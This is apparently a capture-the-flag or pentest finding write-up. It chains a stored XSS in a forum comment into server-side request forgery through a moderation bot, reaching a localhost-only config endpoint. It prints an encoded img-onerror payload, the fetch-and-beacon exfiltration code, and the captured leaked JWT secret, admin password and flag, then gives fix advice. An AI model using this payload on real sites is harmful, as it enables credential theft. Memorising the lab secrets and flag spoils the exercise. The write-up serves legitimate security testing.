# Finding 06 — Stored-XSS bot SSRF relay → localhost-only `/internal/config` → FLAG 6

**Target:** http://localhost:4942 (same host as attacker this session)
**Severity:** Critical
**Status:** Confirmed exploitable
**Flag:** `FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}`

## Summary

Chaining Finding 05's stored XSS with a *fetch-and-relay* payload turns the
server-side moderation bot into an SSRF proxy. The bot's browser originates
from `127.0.0.1` and — unlike a direct request — is allowed to read
`/internal/config`, which is gated as "localhost only". The response body is
exfiltrated to the attacker listener via an image beacon.

Direct `curl http://localhost:4942/internal/config` from the same host still
returns `403 {"error":"forbidden"}` (tested anonymous, with cadet/staff/god
sessions, with the bot's stolen moderator JWT + `flag` cookie, with
HeadlessChrome UA, with `Sec-Fetch-*`/`Origin`/`Referer` header sets, with
`Host: 127.0.0.1:4942`, and with `x-42-internal` variants) — the exact gate
mechanism was **not** identified, but the bot's same-origin fetch passes it.
That the config is exposed at all is already stated by the site's own deploy
log: *"wil: JWT config endpoint moved to /internal/config (localhost only). Do
NOT expose."*

## Steps to reproduce

1. Listener on port 8888 (same as Finding 05).

2. While authenticated, post a forum comment on the thread the bot watches
   (`/forum/bbeo32ucx0a65b8`). Because the bot does **not** execute
   `<script>` elements (only inline event handlers fire), the payload must be
   an `<img onerror>` whose JS is `eval(String.fromCharCode(...))`-encoded to
   stay quote-safe inside the attribute:

   ```html
   <img src=x onerror="eval(String.fromCharCode(118,97,114,...))">
   ```

   with the decoded JS being:

   ```js
   fetch('/internal/config')
     .then(r => r.text())
     .then(t => { new Image().src =
       'http://127.0.0.1:8888/config?d=' + encodeURIComponent(t) })
   ```

3. On the bot's next visit (observed cadence ~1–2 min), the listener receives:

   ```
   GET /config?d=%7B%22jwt_secret%22%3A%2242network%22%2C%22pb_admin_email%22
   %3A%22admin%4042network.local%22%2C%22pb_admin_password%22%3A%22Darkly42
   Admin%21%22%2C...%22darkly_flag%22%3A%22FLAG%7Bd3fus3dxml_n3xt_spr1nt_pr0m1s3%7D%22%7D
   User-Agent: ... HeadlessChrome/120.0.6099.28 ...
   Referer: http://127.0.0.1:4942/
   ```

4. Decoded exfil (full `/internal/config` JSON):

   ```json
   {
     "jwt_secret": "42network",
     "pb_admin_email": "admin@42network.local",
     "pb_admin_password": "Darkly42Admin!",
     "app_version": "1.0.0",
     "campus": "wilcity",
     "darkly_flag": "FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}"
   }
   ```

## Impact

- Flag 6 disclosed.
- **PocketBase superuser credentials** (`admin@42network.local` /
  `Darkly42Admin!`) disclosed → total backend takeover, see Finding 07.

## Fix recommendation

- Serve internal config only to trusted *server-side* identities (mTLS,
  unix socket, or PB service account) — never to browser-origin requests,
  regardless of source IP.
- Sanitize forum HTML (Finding 05) — this entire chain depends on it.
- Rotate `jwt_secret` and PB admin credentials; both are now burned twice
  (Finding 02 / this file).
